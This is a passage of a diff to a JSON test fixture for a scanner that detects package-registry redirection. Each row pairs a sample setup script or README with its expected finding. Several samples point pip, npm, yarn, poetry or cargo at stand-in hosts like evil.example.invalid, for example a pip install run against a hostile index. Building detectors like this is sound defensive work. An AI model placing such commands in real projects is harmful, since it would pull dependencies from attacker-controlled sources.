@@ -1,6 +1,6 @@
 {
   "schema_version": 1,
-  "expected_row_count": 28,
+  "expected_row_count": 165,
   "rows": [
     {
       "id": "control-pip-global-index",
@@ -541,6 +541,2584 @@
           "destination_status": "resolved",
           "file": "pom.xml",
           "start_line": 5
+        }
+      ]
+    },
+    {
+      "id": "control-executable-00af35f0d55f",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho 'npm config set registry https://a.invalid'\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-067b418b404d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nenv FOO=1 pip config set global.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-073f7f296605",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn -Dmaven.repo.remote=https://evil.example.invalid/repo package\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-07b2015705ce",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid --location=project\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-08eab67c462e",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config get registry --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-0c5110f916e4",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n\\npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-0d04884b65a6",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho 'do NOT run npm config set registry https://packages.example.invalid'\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-0d483a1b201b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<'END'\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-10e104de8631",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry config repositories.foo.url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "set",
+          "scope": "repository",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-1128d82c7906",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<-EOF\n\tnpm config set registry https://packages.example.invalid\n\tEOF\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-1596aa14a0a8",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm view lodash version --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-181499b35284",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nenv npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-186d714c4d46",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn >/dev/null -Dmaven.repo.remote=https://evil.example.invalid/simple package\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-1900aa47d591",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add --priority=explicit private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-1aa904ea7e22",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://registry.npmjs.org/\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-1cef79565c27",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n(\n  npm config set registry https://a.invalid\n)\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-1f75a7b1683a",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho done   # npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-22baf76b1494",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set //packages.example.invalid/:_authToken abc123\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-256a915eb1fc",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<-EOF\n\tregistry=https://packages.example.invalid\n\tEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-26bfa21457da",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```sh copy\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-288d4b0cd313",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncd /tmp && npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-292b141a6b74",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nprintf '%s\\n' 'run: npm config set registry https://packages.example.invalid'\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-2a0a0d196e3a",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nFOO=bar npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2a5bf10b5529",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://packages.example.invalid --location=project\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2a637a0e2c3e",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n{\n  npm config set registry https://a.invalid\n}\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2c4a6e56d529",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config delete registry\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-2c8f3c64b150",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nif [ -n \"$HOME\" ]; then\n  npm config set registry https://a.invalid\nfi\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2c9b51aa2932",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho hi; npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2ec17d098130",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncase \"$1\" in\n  setup) npm config set registry https://a.invalid ;;\nesac\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2fd1703bf04f",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncase \"$1\" in\n  setup|install) npm config set registry https://a.invalid ;;\nesac\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-2ffea65f2cae",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<EN\"D\"\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-30f28f3065b6",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-320c3e22a0dd",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nif [ -n \"$HOME\" ]; then npm config set registry https://a.invalid; fi\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-327f369a8120",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set npmRegistryServer https://packages.example.invalid --home\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-3393e78d7e96",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat 1>.npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-34ca7064ed46",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nCARGO_REGISTRIES_EVIL_INDEX=https://evil.example.invalid/index cargo build\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-34fa4a98cbc9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho start; npm config set registry https://packages.example.invalid; echo done\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-351143540080",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn -Dmaven.repo.remote=https://a.invalid install\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-3866ca1b569d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho \"npm config set registry https://packages.example.invalid\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-3a4463dba9c8",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set npmRegistryServer https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-3c6bf3b35a3d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "limitation",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat 3<<EOF > .npmrc\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [],
+      "expected_limitation": {
+        "reason": "dependency_source_parse_incomplete",
+        "path": "scripts/setup.sh",
+        "range": {
+          "start_line": 2,
+          "end_line": 4
+        }
+      }
+    },
+    {
+      "id": "control-executable-3d157e28761b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsudo npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-40c18d9071f9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set global.index-url https://pypi.org/simple\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-431d83551e3b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n( echo a; npm config set registry https://a.invalid )\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-4bad712dcc7d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-4d2732223030",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set @acme:registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-4f4ca27f0d6b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nfor i in 1 2; do npm config set registry https://a.invalid; done\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-515e203b51e0",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npython3 -m pip install --index-url https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-51ed17d1028c",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<$\"END\"\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-524923a1ab86",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<'OUTER'\ncat > .npmrc <<INNER\nregistry=https://packages.example.invalid\nINNER\nOUTER\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-542c1d47240c",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<${VAR}\nregistry=https://packages.example.invalid\n${VAR}\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-556d711dece1",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<\"END\"\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-584560c78a89",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsetup() {\n  npm config set registry https://a.invalid\n}\nsetup\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-587a57c654a0",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm\tconfig\tset\tregistry\thttps://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-596abecd9d7b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > \".npmrc\" <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-5f9d5a542980",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "docs/README.md": "# d\n```bash\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "docs/README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6058b5cf0e7c",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncd /app && poetry source add private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-61fe95351d35",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nexport PIP_INDEX_URL=https://a.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://a.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-63f772637548",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsudo -E npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6426380818c9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nprintf '%s\\n' 'poetry source add private https://evil.example.invalid/simple'\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-643a8871856d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nCMD=\"npm config set registry https://packages.example.invalid\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-646b0014c2e3",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nexport CARGO_REGISTRIES_EVIL_INDEX=https://evil.example.invalid/index\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
